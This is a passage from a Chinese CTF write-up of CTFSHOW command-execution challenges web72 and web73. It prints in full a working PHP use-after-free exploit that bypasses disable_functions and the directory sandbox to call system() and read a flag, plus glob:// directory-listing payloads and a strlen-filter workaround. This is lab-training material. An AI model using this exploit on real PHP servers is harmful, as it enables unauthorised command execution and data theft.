class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/72_01.png" alt=""></p><p>发现改名了，尝试文件包含读取文件名<code>c=include(&quot;flag0.txt&quot;);exit();</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/72_02.png" alt=""></p><p>发现不行，尝试用网上的一个绕过安全目录的uaf脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br></pre></td></tr></table></figure><p>将上述代码当作参数POST传参，要记得编码，成功拿到flag</p><h1 id="web73"><a href="#web73" class="headerlink" title="web73()"></a>web73()</h1><p>跟上题差不多，尝试用<code>glob://</code>读取目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>发现flag文件名为<code>flagc.txt</code></p><p>继续通过uaf脚本读取文件</p><p>发现不行，<code>strlen</code>不让用了，可以自己写一个替换函数来替换<code>strlen</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_user</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$s</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上述代码放到uaf脚本中，将<code>strlen</code>函数替换，最终uaf脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 